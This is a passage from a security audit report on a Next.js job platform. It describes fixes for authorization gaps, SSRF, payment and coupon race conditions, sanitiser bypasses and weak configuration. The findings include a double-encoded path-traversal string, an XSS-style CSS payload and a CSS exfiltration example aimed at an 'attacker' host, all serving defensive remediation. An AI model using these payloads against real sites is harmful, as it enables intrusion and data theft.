`update({ credits: currentBalance - boostCost }).eq('id', employee.id)`.

**Impact.** Drain 50 credits per call from any employee account whose UUID is known. Concurrent
requests could also double-spend, boosting several jobs for the price of one.

**Fix implemented.**
- `requireAuth`, then the supplied `employeeId` is bound to the verified session: the caller
  must be an administrator, or match the employee row by UUID, or match it by email.
- The deduction became a compare-and-set: `.eq('credits', currentBalance)`. If the balance
  changed under a concurrent request the update matches no rows and the handler returns 409
  rather than granting a second boost.
- The credit deduction now happens **before** the job update, and the credits are refunded if
  the job update fails, so a failed boost never silently consumes credits.

**Files changed.** `src/app/api/jobs/[id]/boost/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/jobs/[id]/boost —
spending another account's credits".

**Verification.** Passing.

---

### VULN-025 — Unauthenticated debug endpoints disclosing schema and internal errors

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `GET /api/debug-db`, `GET /api/debug-signup-error` |

**Root cause.** Neither had authentication. `debug-db` probed six tables and returned existence,
column counts and raw PostgREST error messages. `debug-signup-error` returned the five most
recent rows of the `signup_errors` table verbatim.

**Impact.** Database schema reconnaissance, and disclosure of internal error content that
routinely includes email addresses and identifiers from failed signups.

**Fix implemented.** `requireAdmin` on both.

**Files changed.** `src/app/api/debug-db/route.ts`, `src/app/api/debug-signup-error/route.ts`

**Regression test.** `tests/route-authorization.test.ts` — both endpoints; `debug-db` is also
one of the two routes deliberately reverted to prove the tests detect the flaw.

**Verification.** Passing. **Recommendation:** delete both files; they have no production purpose.

---

### VULN-026 — Unauthenticated notification read and write

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `GET`, `POST`, `PATCH /api/notifications`; `POST /api/notifications/token` |

**Root cause.** Identity came from a `userId` parameter with no session check.

**Impact.** Read any user's notification history — which contains application outcomes, hiring
status and other sensitive activity — mark their notifications read, inject fabricated
notifications, and register an attacker's push token against a victim's account so the victim's
push notifications are delivered to the attacker's device.

**Fix implemented.** `requireAuth` on all four handlers plus `isOwnerOrAdmin(authUser, userId)`.

**Files changed.** `src/app/api/notifications/route.ts`, `src/app/api/notifications/token/route.ts`

**Regression test.** `tests/api-surface.test.ts` `mustBeGuarded` entries requiring both
`requireAuth` and `isOwnerOrAdmin`.

**Verification.** Passing.

---

### VULN-027 — Unauthenticated AI endpoints

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/resume/ai-assist`, `/api/resume/gap-analysis`, `/api/resume/parse`, `/api/resume/export-pdf`, `/api/career-assistant` |

**Root cause.** None required a session. Each forwards content to Groq/x.ai on the server's API
key, or renders a PDF server-side.

**Impact.** Unbounded consumption of the AI budget by anonymous callers; use of the JobsDart
API key as a free LLM proxy; CPU exhaustion via server-side PDF rendering. `career-assistant`
additionally accepted a `userId` and could read that profile and submit job applications on
their behalf.

**Fix implemented.** `requireAuth` on all five, plus `isOwnerOrAdmin` on `career-assistant`'s
`userId`. These endpoints sit in the middleware's 20-requests-per-minute tier, which is now
actually enforceable following the VULN-018 fix.

**Files changed.** the five route files listed above

**Regression test.** `tests/route-authorization.test.ts` — "POST /api/career-assistant";
`tests/api-surface.test.ts` covers the rest structurally.

**Verification.** Passing.

---

### VULN-028 — Coupon rules not re-checked at payment verification, and non-atomic redemption

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/payments/verify` |

**Root cause.** `create-order` validated `expires_at`, `current_uses < max_uses`, `is_active`
and plan applicability. `verify` re-applied the discount but checked **only** plan
applicability — so an expired, deactivated or exhausted coupon still reduced the recorded
amount, and `current_uses` was then incremented past `max_uses` by a read-modify-write.

**Impact.** Expired and exhausted coupons remained redeemable; concurrent redemptions could
both pass the cap check, so a single-use coupon could be redeemed many times.

**Fix implemented.** `verify` now applies the same four rules as `create-order`. Redemption is
claimed with a compare-and-set — `.eq('current_uses', <value read>)` — and the discount is
honoured **only if that update matched a row**, so concurrent redemptions cannot both succeed.
The migration adds a `coupons_uses_within_cap` CHECK constraint as a backstop.

**Files changed.** `src/app/api/payments/verify/route.ts`, `migration_security_integrity.sql`

**Verification.** Code re-read; the coupon block is now unreachable for an invalid coupon and
the increment is conditional.

---

### VULN-029 — Unauthenticated CRUD on shared reference data

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/skills`, `PUT`/`DELETE /api/skills/[id]`, `POST`/`PUT`/`DELETE` on `/api/job-types`, `/api/experience-levels`, `/api/workplace-types`, `/api/notice-periods` |

**Root cause.** No authentication on any write verb.

**Impact.** Corrupt or delete the taxonomies that job matching, search filters and the
recommendation engine depend on. Deleting a `job_type` or `skill` row breaks every job and
profile referencing it — an application-wide integrity and availability issue.

**Fix implemented.** `requireAdmin` on every write verb across all six route files. `GET`
remains public, since these lists populate public search filters.

**Files changed.** `src/app/api/skills/route.ts`, `src/app/api/skills/[id]/route.ts`,
`src/app/api/job-types/route.ts`, `src/app/api/job-types/[id]/route.ts`,
`src/app/api/experience-levels/route.ts`, `src/app/api/experience-levels/[id]/route.ts`,
`src/app/api/workplace-types/route.ts`, `src/app/api/workplace-types/[id]/route.ts`,
`src/app/api/notice-periods/route.ts`

**Regression test.** Six behavioural cases in `tests/route-authorization.test.ts` plus
`tests/api-surface.test.ts`.

**Verification.** Passing.

---

### VULN-030 — Unauthenticated community content CRUD

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | 11 route files under `/api/communities/**` |

**Root cause.** Every write verb — create/update/delete communities, posts, comments,
reactions, events, resources, joins, bookmarks and moderation reports — ran without a session,
with the author identified by a body field.

**Impact.** Post, edit and delete content as any user; delete other people's communities and
posts; manipulate reaction counts; read and alter the moderation report queue.

**Fix implemented.** `requireAuth` on all write verbs across the 11 route files. Read verbs on
communities, posts, comments, events and resources remain public, preserving anonymous
browsing.

**Files changed.** `src/app/api/communities/route.ts`, `communities/[id]/route.ts`,
`communities/[id]/posts/route.ts`, `communities/[id]/events/route.ts`,
`communities/[id]/resources/route.ts`, `communities/[id]/join/route.ts`,
`communities/posts/[postId]/route.ts`, `communities/posts/[postId]/comments/route.ts`,
`communities/posts/[postId]/reactions/route.ts`, `communities/bookmarks/route.ts`,
`communities/onboarding-autojoin/route.ts`, `communities/reports/route.ts`

**Regression test.** `tests/api-surface.test.ts` structural coverage.

**Verification.** Passing. **Note:** these now require authentication, but per-record author
ownership on edit/delete was not added — see Remaining Risks.

---

### VULN-031 — Unauthenticated access to saved jobs, subscription status and currency preference

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `GET`/`POST`/`DELETE /api/jobs/saved`, `GET /api/subscription/check`, `POST /api/currency/preferred` |

**Root cause.** Identity from a `userId`/`recruiterId` parameter with no session check.

**Impact.** Read any user's saved-jobs list (revealing job-search intent — sensitive for an
employed candidate), add and remove entries, read any recruiter's plan type and expiry, and
change any user's billing currency preference.

**Fix implemented.** `requireAuth` plus `isOwnerOrAdmin` on all five handlers.

**Files changed.** `src/app/api/jobs/saved/route.ts`, `src/app/api/subscription/check/route.ts`,
`src/app/api/currency/preferred/route.ts`

**Regression test.** `tests/api-surface.test.ts` `mustBeGuarded` entries.

**Verification.** Passing.

---

### VULN-032 — SSRF via Host-derived origin in the career assistant

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/career-assistant` |

**Root cause.** The handler performed an internal call to
`` fetch(`${req.nextUrl.origin}/api/applications`) ``. `req.nextUrl.origin` is derived from the
`Host` header, which the client controls. The call also forwarded no credentials, so the
feature was silently broken as well as unsafe.

**Impact.** A crafted `Host` header redirected a server-originated POST to an
attacker-controlled or internal address, carrying the job and user identifiers in the body.

**Fix implemented.** The origin now comes from `process.env.NEXT_PUBLIC_APP_URL`, falling back
to `req.nextUrl.origin` only when unset. The caller's `authorization` and `cookie` headers are
forwarded so `/api/applications` applies its own (already correct) authorization check — which
also repairs the broken apply-from-chat feature.

**Files changed.** `src/app/api/career-assistant/route.ts`

**Verification.** Code re-read; `requireAuth` and `isOwnerOrAdmin` were added in the same change
under VULN-027.

---

### VULN-033 — Double-encoded payloads bypassed the WAF

| | |
|---|---|
| **Severity** | **High** |
| **Component** | Edge middleware |

**Root cause.** The payload screen called `decodeURIComponent` exactly once. A payload encoded
twice (`%252e%252e%252f` → `%2e%2e%2f` → `../`) survived the single pass unmatched. A malformed
encoding would also throw, producing a 500 rather than a rejection.

**Fix implemented.** The URL is decoded up to three times, stopping when it stabilises, and the
screen runs on the fully decoded value. A malformed encoding now returns 400 instead of
throwing.

**Files changed.** `src/middleware.ts`

**Regression test.** `tests/middleware-defenses.test.ts` — "blocks double-encoded traversal
payloads".

**Verification.** Passing.

---

### VULN-034 — Resume download in the auto-apply worker not screened for SSRF

| | |
|---|---|
| **Severity** | **High** |
| **Endpoint** | `POST /api/linkedin/auto-apply` |

**Root cause.** This handler was already well guarded — `requireAuth`, strict UUID validation
against path traversal, and `isOwnerOrAdmin`. But it called `fetch(resolvedUrl)` on the
profile's stored `resume_url`, and that column was writable through the (then unauthenticated)
VULN-005 endpoint, so its content was effectively attacker-controlled. The result is written to
disk and referenced by a spawned Python process.

**Fix implemented.** The download now uses `safeFetch()` with a 5 MB cap. Combined with the
VULN-005 fix constraining `resume_url` to `r2://` or `https://`, both the source and the fetch
are now controlled.

**Files changed.** `src/app/api/linkedin/auto-apply/route.ts`

**Verification.** Covered by `tests/ssrf-guard.test.ts` for the guard itself.

---

### VULN-035 — Session cookie set without `Secure`, and readable by JavaScript

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | Session management |

**Root cause.** The Supabase access token is written client-side with
`document.cookie = "sb-access-token=...; path=/; max-age=604800; SameSite=Lax"` in three
places. No `Secure` attribute, and a cookie written from JavaScript cannot be `HttpOnly`.

**Impact.** Without `Secure`, the session token is transmitted over any plaintext connection to
the origin. Without `HttpOnly`, any XSS (such as VULN-020) reads the token directly. The
7-day lifetime is long for a bearer token.

**Fix implemented.** `; Secure` is appended whenever `window.location.protocol === 'https:'`,
in all three locations. Local development over `http://localhost` is unaffected.

`HttpOnly` **cannot** be fixed from the client. Doing it properly requires a server-side
session endpoint that issues the cookie with `Set-Cookie: HttpOnly; Secure; SameSite=Lax`,
which is an architectural change beyond the remit of a minimal security fix. It is recorded
under Recommended Future Improvements.

**Files changed.** `src/app/login/page.tsx`, `src/app/company/login/page.tsx`,
`src/contexts/user-context.tsx`

**Verification.** Build passes; the cookie string is unchanged apart from the conditional
attribute.

---

### VULN-036 — Referral reward race condition

| | |
|---|---|
| **Severity** | **Medium** |
| **Endpoint** | `POST /api/referral/claim` |

**Root cause.** Classic check-then-act: the handler read `referral_rewarded`, granted credits
to both parties, and only then set the flag. Concurrent requests could all observe `false`.

**Impact.** Multiplied referral credits from a single legitimate referral.

**Fix implemented.** The flag is claimed **first**, with a conditional update
(`.or('referral_rewarded.is.null,referral_rewarded.eq.false')`) whose returned row count
decides whether credits are granted. Exactly one concurrent request can win. The migration
also backfills `NULL` values and sets a `false` default so the condition is meaningful for
existing rows.

**Files changed.** `src/app/api/referral/claim/route.ts`, `migration_security_integrity.sql`

**Verification.** Code re-read; the award block is now inside `if (rewardClaimed)`.

---

### VULN-037 — Inline CSS survived the job-description sanitiser

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | Job description rendering |

**Root cause.** `DOMPurify.sanitize(decoded)` was called with **default options**, which retain
the `style` attribute. This was found by a regression test written during the audit: the
payload `<div style="background:url(javascript:alert(1))">x</div>` passed through unmodified.

**Impact.** Modern browsers do not execute `javascript:` inside CSS `url()`, so this is not
script execution. It is, however, CSS injection into a page a recruiter controls the content
of: silent exfiltration through `background:url(https://attacker/?data=...)`, and layout
spoofing over the surrounding page.

**Fix implemented.** New `src/lib/sanitize-html.ts` with two explicit profiles.
`sanitizeRichText()` allows only structural and formatting tags, allows only
`href/title/target/rel/colspan/rowspan`, restricts URIs to `https?|mailto|tel`, and explicitly
forbids the `style` attribute along with `style`, `script`, `iframe`, `object`, `embed`, `form`
and `input` elements. `sanitizeInlineMarkup()` carries the narrow allowlist used for model
output. Both call sites were switched over.

**Files changed.** new `src/lib/sanitize-html.ts`, `src/app/jobs/[id]/job-details-client.tsx`,
`src/components/chat/CareerAssistant.tsx`

**Regression test.** `tests/input-hardening.test.ts` — 9 payloads asserting no `<script`,
`onerror=`, `onload=`, `javascript:`, `<iframe`, `<object` **or `style=`** survives, plus a test
confirming legitimate formatting (`<strong>`, `<li>`) is preserved.

**Verification.** Passing.

---

### VULN-038 — Brevo webhook uses a static shared token rather than a body signature

| | |
|---|---|
| **Severity** | **Medium** |
| **Endpoint** | `POST /api/webhooks/brevo` |

**Root cause.** `verifyBrevoWebhookSignature` compares the `x-brevo-signature` header against
`BREVO_WEBHOOK_SECRET` verbatim. The comparison is constant-time and fails closed when the
secret is unset, which is good — but it is a static bearer token, not an HMAC over the request
body. There is no timestamp and no replay protection.

**Impact.** Anyone who learns the token (from a log, a proxy, or a misconfigured intermediary)
can forge unlimited webhook events: marking candidates unsubscribed, or falsifying delivery
and open statistics. A captured request can be replayed indefinitely.

**Status.** **Not changed.** Moving to an HMAC-over-body scheme requires a matching change in
the Brevo dashboard configuration, which is outside the codebase and would break live webhook
delivery if deployed unilaterally. The existing check is not broken, only weak. Recorded under
Recommended Future Improvements with the exact remediation.

---

### VULN-039 — PayPal verification could be bypassed via `NODE_ENV`

| | |
|---|---|
| **Severity** | **Medium** |
| **Endpoint** | `POST /api/payments/verify` |

**Root cause.** When `PAYPAL_CLIENT_SECRET` was unset, `verifyPayPalOrder` returned
`process.env.NODE_ENV !== 'production'` — i.e. it accepted the client's unverified receipt in
any environment not explicitly labelled `production`. `PAYPAL_CLIENT_SECRET` is **not present
in the repository `.env`**, so this branch is the live one.

**Impact.** In any deployment where `NODE_ENV` is unset or set to something other than
`production` — a staging environment, a misconfigured container — every PayPal payment would be
accepted without verification, granting plans for free.

**Fix implemented.** The bypass now requires **both** `NODE_ENV === 'development'` **and** an
explicit `ALLOW_UNVERIFIED_PAYPAL_IN_DEV === 'true'`. A missing or unexpected `NODE_ENV` no
longer opens it.

**Files changed.** `src/app/api/payments/verify/route.ts`

**Verification.** Code re-read. **Configuration action required:** set `PAYPAL_CLIENT_SECRET`
in production, or PayPal payments will be rejected.

---

### VULN-040 — Build-time type checking disabled

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | Build configuration |

**Root cause.** `next.config.mjs` set `typescript.ignoreBuildErrors: true`, so type errors
never failed a build. Type errors in this codebase have historically masked genuine defects,
including mismatched identity types between `id` (bigint) and `uuid` columns — precisely the
confusion underlying several of the IDOR findings above.

**Fix implemented.** `npx tsc --noEmit` was run and reported **0 errors**, so the escape hatch
was no longer serving any purpose. `ignoreBuildErrors` is now `false`, and `next build` was
re-run to confirm it still succeeds with type checking active.

`eslint.ignoreDuringBuilds` was left at `true`: ESLint is **not configured at all** in this
project (`next lint` prompts for interactive setup), so flipping it would break the build. That
is recorded under Recommended Future Improvements.

**Files changed.** `next.config.mjs`

**Verification.** `npx tsc --noEmit` → 0 errors; `npm run build` → success.

---

### VULN-041 — Vulnerable dependencies

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | Supply chain |

**Baseline.** `npm audit` reported **100 vulnerabilities** (4 critical, 27 high, 66 moderate,
3 low).

The runtime-reachable ones that mattered most:

| Package | Severity | Relevance |
|---|---|---|
| `axios` (direct) | High | NO_PROXY hostname-normalisation **SSRF** bypass; auth bypass via prototype pollution in `validateStatus` |
| `fast-xml-parser` | Critical | Entity-encoding bypass and DoS; reached through `@aws-sdk/client-s3` parsing R2 responses |
| `jws` | High | Improper HMAC signature verification; reached through `firebase-admin` token verification |
| `tar` | Critical | Arbitrary file write via hardlink path traversal |
| `form-data` | High | CRLF injection via unescaped multipart field names |
| `next` (direct) | High | Image-optimizer DoS; RSC deserialization DoS |

**Fix implemented.** `npm audit fix` (non-breaking only, no `--force`) reduced the count from
**100 → 71** (2 critical, 12 high, 57 moderate, 0 low). `axios` moved to 1.20.0, the latest
1.x, which addresses the SSRF and prototype-pollution advisories. The full test suite and a
production build were re-run afterwards and both pass.

**Not upgraded, deliberately.** Every remaining high and critical requires a **major** version
bump, which your instructions excluded:

| Remaining | Requires | Assessment |
|---|---|---|
| `next` 14.2.35 | `next@16` | 14.2.35 is the newest release on the 14.2 line. Both advisories are DoS, not data compromise. |
| `@genkit-ai/*`, `@opentelemetry/*` (7 packages) | `genkit@0.5.17` | Reached only through Genkit dev tooling, not the request path. |
| `postcss` | `next@16` | Build-time only. |
| `vitest`, `vite` | `vitest@5` | Dev-only, introduced by this audit. The advisory requires the Vitest **UI server** to be listening, which this project never starts. An upgrade attempt failed on peer-dependency conflicts and was reverted. |

**Files changed.** `package.json`, `package-lock.json`

**Verification.** 255/255 tests pass and `npm run build` succeeds after the upgrades.

---

### VULN-042 — Verbose internal errors returned to clients

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | Error handling (application-wide) |

**Root cause.** `src/lib/security.ts` provides `safeErrorResponse()`, which correctly omits
detail in production — but most handlers do not use it, instead returning
`{ error: '...', details: error.message }` unconditionally. Supabase error messages routinely
contain table names, column names and constraint names.

**Impact.** Schema disclosure aiding further attack. Not directly exploitable.

**Status.** **Partially addressed.** The routes touched during remediation return generic
messages on the new authorization and validation paths. A blanket rewrite of ~90 catch blocks
was judged higher-risk than the finding warrants — it would touch nearly every route for an
informational-grade issue. The correct fix is mechanical and is recorded under Recommended
Future Improvements: route every catch block through the existing `safeErrorResponse()`.

---

### VULN-043 — AES-256-CBC without an authentication tag; key falls back to the service-role key

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | `src/lib/encryption.ts` (chat message encryption) |

**Root cause.** Two issues. The cipher is `aes-256-cbc` with no MAC, so ciphertext is malleable
and the code is a padding-oracle candidate — `decrypt()` catches failures and returns the input
unchanged, which is itself an oracle signal. Separately, the key is derived from
`ENCRYPTION_KEY || NEXTAUTH_SECRET || SUPABASE_SERVICE_ROLE_KEY`; neither `ENCRYPTION_KEY` nor
`NEXTAUTH_SECRET` is defined in `.env`, so **the service-role key is currently the encryption
key**. Reusing a credential across two purposes means rotating one forces the other.

**Status.** **Not changed.** Switching to `aes-256-gcm` changes the ciphertext format, and
`decrypt()`'s legacy-passthrough behaviour indicates existing unencrypted and CBC-encrypted
rows are already in the database. A cipher change without a migration would corrupt stored
chat history. The remediation — set a dedicated `ENCRYPTION_KEY`, add a versioned ciphertext
prefix, write new data as GCM while continuing to read CBC — is recorded under Recommended
Future Improvements.

**Immediate configuration action:** define a dedicated `ENCRYPTION_KEY` so the service-role key
is no longer doing double duty.

---

### VULN-044 — Unbounded growth of the in-memory rate-limit map

| | |
|---|---|
| **Severity** | **Medium** |
| **Component** | Edge middleware |

**Root cause.** Expired entries were purged at most once every 60 seconds. Combined with
VULN-018 — where an attacker could mint a fresh key per request — the map could grow without
bound between cleanups.

**Fix implemented.** A `MAX_RATE_LIMIT_KEYS` ceiling of 20,000 triggers cleanup regardless of
elapsed time, and if expiring entries is insufficient the oldest keys are dropped outright.

**Files changed.** `src/middleware.ts`

**Verification.** Covered indirectly by the rate-limiting tests.

---

### VULN-045 — Missing `form-action` and cache directives

| | |
|---|---|
| **Severity** | **Low** |
| **Component** | Security headers |

**Root cause.** The CSP set `frame-ancestors`, `object-src` and `base-uri`, but not
`form-action`, so injected markup could post a form to an external origin. API responses
carrying account data set no `Cache-Control`.

**Fix implemented.** Added `form-action 'self'` and `upgrade-insecure-requests` to the CSP in
both `src/middleware.ts` and `next.config.mjs`. API responses now receive
`Cache-Control: no-store, no-cache, must-revalidate, private` and `Pragma: no-cache`.

A restrictive `script-src` was **deliberately not added**: Next.js emits inline bootstrap
scripts, so tightening it requires per-request nonces and a Report-Only rollout. Adding it
blindly would break the application, which your instructions explicitly cautioned against. It
is recorded under Recommended Future Improvements.

**Files changed.** `src/middleware.ts`, `next.config.mjs`

**Regression test.** `tests/middleware-defenses.test.ts` — "sets the expected hardening headers"
and "marks API responses as uncacheable by shared caches".

**Verification.** Passing.

---

### VULN-046 to VULN-051 — Low and informational

| ID | Finding | Status |
|---|---|---|
| VULN-046 | `NEXT_PUBLIC_STITCH_API_KEY` duplicates a server key into the browser bundle. Any `NEXT_PUBLIC_*` value is public. | **Not changed** — needs confirmation of whether the Stitch key is client-safe. If not, remove the `NEXT_PUBLIC_` variant, proxy through a server route, and rotate. |
| VULN-047 | `/api/coupons/validate` and `/api/referral/validate` are unauthenticated code-check oracles, enabling brute-force discovery of short codes. | **Partially mitigated** — the VULN-018 fix makes the 100/min limit actually enforceable. See Remaining Risks. |
| VULN-048 | ESLint is not configured, so no static analysis runs. | **Not changed** — see Recommended Future Improvements. |
| VULN-049 | Rate-limit state is per-process memory, so limits do not hold across serverless instances or after a cold start. | **Not changed** — needs Redis or an edge rate limiter. |
| VULN-050 | `src/app/admin/crm/page.tsx:840` renders an email template with `dangerouslySetInnerHTML`. | **Assessed, no change** — the HTML comes from `renderCRMTemplate()` with a hardcoded sample candidate, so it is application-generated, not user-supplied. Sanitising it would break preview fidelity. Recommend a sandboxed iframe. |
| VULN-051 | RLS is enabled with sensible policies in `migration_enable_rls.sql`, but every route uses the service-role key, so RLS never applies to API traffic. | **Documented** — the policies are valuable defence in depth for direct database access. See Recommended Future Improvements. |

---

## Findings by category

### Authentication Findings

Authentication itself is sound. `getAuthenticatedUser()` verifies a bearer token against
Supabase Auth and falls back to Firebase `verifyIdToken`, then resolves the profile across
`admins` → `jobseekers` → `recruiters`. Tokens are never trusted without verification, and the
Razorpay HMAC comparison correctly uses `timingSafeEqual`.

Password handling is delegated entirely to Supabase and Firebase — there is no custom password
storage in the request path, so there is no weak-hashing exposure. `/api/auth/login` and
`/api/users/[id]/change-password` are disabled 410 stubs. `/api/auth/password-reset` returns
success whether or not the address exists, so it is **not** an account-enumeration oracle;
reset tokens are Firebase-issued.

The defects were: the cookie carrying the session lacked `Secure` and cannot be `HttpOnly`
(VULN-035); the cron entry point had a guessable default secret (VULN-014); and PayPal
verification could be bypassed through `NODE_ENV` (VULN-039). All three are fixed.

One residual observation: `getAuthenticatedUser` builds PostgREST `.or()` filters by
interpolating the email from the verified token — `` .or(`id.eq.${uid},email.eq.${email}`) ``.
The value comes from a verified token and both providers validate email format, so this is not
currently exploitable, but it is the one place in the auth path where a filter string is built
by concatenation. Recorded under Recommended Future Improvements.

### Authorization Findings

This is where essentially all the risk was concentrated. 43 of 108 handlers accepted a
caller-supplied identifier with no session check. A further handler (`applications/[id]/status`)
authenticated the caller but performed no ownership check at all.

The remediation follows one rule: **identity comes from the verified token, never from the
request.** Where a request must still name a target, `isOwnerOrAdmin` binds it to the session.
For applications and jobs — where ownership is indirect, via the job's `recruiter_pk` /
`admin_pk` — the new `src/lib/authz.ts` provides `getApplicationAccess()` and `getOwnedJob()`
so the logic lives in one place rather than being re-derived per route.

Current state: **50 handlers enforce per-record ownership, 33 are restricted to Admin or Super
Admin, 3 use a cron secret or provider signature, and 22 are public by explicit decision** —
each justified in `API_SECURITY_MATRIX.md`.

### API Findings

Per-endpoint detail is in `API_SECURITY_MATRIX.md`. Beyond the authorization work:

- Mass assignment was checked. Handlers construct explicit update objects field by field rather
  than spreading request bodies, so this class did not appear.
- Method manipulation is not applicable — App Router dispatches by named export; an
  unimplemented verb returns 405.
- Excessive data exposure was found in `extension/get-answers` (VULN-003) and
  `debug-signup-error` (VULN-025), both fixed.
- Pagination and filter abuse: `intelligent-search.ts` builds PostgREST filters from search
  input but routes them through the existing `sanitizePostgrestFilter()`, which strips
  `( ) , . : " ' % \ ;`. Tested in `tests/input-hardening.test.ts`.

### Database Findings

- **No SQL injection.** All request-path queries use the PostgREST client with parameterised
  filters. The only raw SQL lives in root-level maintenance scripts (`migrate.js`,
  `seed_*.js`) that take no request input. `grep` for string-concatenated SQL in `src/` found
  nothing.
- **RLS is enabled** on 24 tables with sensible policies — but is bypassed by the service-role
  key on every API request (VULN-051). It protects only direct database access.
- **Integrity constraints were missing** and are added by `migration_security_integrity.sql`:
  a unique index on `payments.payment_id` (replay), a `current_uses <= max_uses` check on
  coupons, a `referral_rewarded` default, and a 0–5 range check on `applications.rating`.
- Several handlers carry `PGRST204`/`42703` fallback paths that retry with a reduced column
  set. These are functional, not security, defects, but they make behaviour schema-dependent
  and hard to reason about.

### File Upload Findings

Both upload endpoints were unauthenticated and validated nothing beyond file size
(VULN-006, VULN-007). Now, for every upload:

| Control | Implementation |
|---|---|
| Authentication and ownership | `requireAuth` + `isOwnerOrAdmin` |
| Extension allowlist | resumes: `pdf`, `docx`, `doc`; images: `jpg`/`jpeg`, `png`, `webp`, `gif` |
| MIME agreement | declared type must match the extension's canonical type |
| Magic-byte confirmation | `%PDF`, `PK\x03\x04`, OLE2, JPEG/PNG/GIF/RIFF+`WEBP` signatures |
| SVG and HTML | rejected — they are active content that would run from the storage origin |
| Size limits | 2 MB resumes and avatars, 5 MB ATS scorer |
| Empty files | rejected |
| Stored filename | discarded; key is `prefix/ownerId/timestamp-<16 random bytes>.<canonical ext>` |
| Path traversal | owner and prefix segments stripped to `[A-Za-z0-9_-]` |
| Stored Content-Type | server's canonical value, never the client's |
| Access | R2 objects served through short-lived presigned URLs, not public |

Not covered: malware scanning, and archive/decompression-bomb limits inside DOCX parsing.
Both are recorded under Recommended Future Improvements.

### Payment Findings

The signature check was already correct. The failures were in what happened *after* it:

| Issue | Before | After |
|---|---|---|
| Plan binding | plan taken from the request body | order re-read from Razorpay; `notes.planId` must match |
| Account binding | none | `notes.userId` must match the requester |
| Capture status | never checked | must be `captured` or `authorized` |
| Order/payment linkage | never checked | `payment.order_id` must match |
| Replay | unlimited | idempotent duplicate check + unique DB index |
| Coupon validity at verify | plan applicability only | expiry, active flag, usage cap and plan |
| Coupon redemption | read-modify-write | compare-and-set + DB constraint |
| Order creation | unauthenticated | `requireAuth` + `isOwnerOrAdmin` |
| PayPal fallback | open whenever `NODE_ENV !== 'production'` | requires `development` **and** an explicit opt-in flag |

Price calculation was already server-side — `getPlanPrices()` reads from the database and the
client-supplied `amount` is only tolerance-checked, never used — so direct price manipulation
was not possible.

No real transactions were created during this assessment. All payment testing used a stubbed
Razorpay client in `tests/payment-integrity.test.ts`.

### Dependency Findings

Covered in VULN-041. 100 → 71 vulnerabilities via non-breaking upgrades; `axios` (the one with
genuine SSRF relevance) is now on the latest 1.x. All remaining high and critical findings
require major version bumps that were out of scope, and each is individually assessed above.

### Configuration Findings

**Good:** `.env` is git-ignored and has **never** been committed — verified against the full
history with `git log --all --diff-filter=A`. No hardcoded credentials were found anywhere in
`src/` or `scripts/` (searched for `sk_live`, `rzp_live`, `AKIA`, `-----BEGIN`, JWT prefixes and
service-role literals). CORS is pinned to `NEXT_PUBLIC_APP_URL`, not a wildcard, so the
credentialed-wildcard misconfiguration is absent. `poweredByHeader` is disabled.

**Issues found:**

| Item | Status |
|---|---|
| `typescript.ignoreBuildErrors: true` | **Fixed** — now `false`; `tsc` is clean |
| `eslint.ignoreDuringBuilds: true` | Left enabled — ESLint is not configured at all |
| `CRON_SECRET` absent from `.env` | **Fixed in code** (fails closed); **must now be set** |
| `PAYPAL_CLIENT_SECRET` absent | **Fixed in code** (no longer opens a bypass); **must be set for PayPal** |
| `ENCRYPTION_KEY` absent → falls back to the service-role key | Documented (VULN-043); should be set |
| `NEXT_PUBLIC_STITCH_API_KEY` | Documented (VULN-046); confirm whether client-safe |

**No secret values were read, printed or copied at any point in this assessment.** Only
variable *names* were enumerated.

### Logging Findings

`console.log`/`console.error` are used throughout. The R2 initialiser logs credential
*lengths*, not values — deliberate and safe. No passwords, tokens, cookies or API keys were
found being logged.

Two observations:
- `[auth-utils] Firebase sent verification email to ${result.email}` and
  `[password-reset] Firebase sent password reset email to ${email}` log email addresses. That
  is PII in application logs; acceptable if log retention is controlled, worth reviewing.
- Security events are **not systematically logged**. `[WAF_BLOCKED]` is the only dedicated
  security log line. Failed authorization (403), failed payment verification, admin actions and
  webhook rejections produce no structured, greppable event. This is the weakest area of the
  entire assessment and is the basis for the Monitoring score below.

### Security Headers

| Header | Status |
|---|---|
| `Strict-Transport-Security` | Present — `max-age=63072000; includeSubDomains; preload` |
| `X-Content-Type-Options` | Present — `nosniff` |
| `X-Frame-Options` | Present — `SAMEORIGIN` |
| `Referrer-Policy` | Present — `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Present — camera/microphone denied |
| `Content-Security-Policy` | Partial — `frame-ancestors`, `object-src`, `base-uri`, **`form-action` (added)**, **`upgrade-insecure-requests` (added)**. No `script-src` — see below |
| `Cache-Control` on API responses | **Added** — `no-store, no-cache, must-revalidate, private` |
| `X-Powered-By` | Disabled |

`script-src` remains absent by deliberate decision. Next.js emits inline bootstrap scripts, so
a restrictive `script-src` requires per-request nonces threaded through the document, and
deploying one blind would break the application. The rollout path is in Recommended Future
Improvements.

### Rate Limiting

Tiers are sensible — 15/min for auth and payments, 20/min for AI, 100/min for other API
routes, 300/min for pages. The problems were that the limits **did not work**: the key was
attacker-controlled (VULN-018) and any path containing a dot skipped the limiter entirely
(VULN-019). Both are fixed and covered by tests.

Two structural limitations remain: the counter lives in per-process memory, so it does not hold
across serverless instances (VULN-049); and limiting is per-IP only, so an authenticated
attacker rotating source addresses is not additionally constrained by account. Both are in
Recommended Future Improvements.

### Business Logic

Abuse paths identified and closed:

| Abuse | Finding |
|---|---|
| Activate an expensive plan having paid for the cheapest | VULN-010 |
| Replay one payment for unlimited credits and plan time | VULN-011 |
| Mint a 100%-discount coupon | VULN-012 |
| Redeem expired or exhausted coupons | VULN-028 |
| Exceed a coupon's usage cap by racing | VULN-028 |
| Farm referral credits against arbitrary accounts | VULN-016 |
| Multiply referral credits by racing | VULN-036 |
| Drain another account's boost credits | VULN-024 |
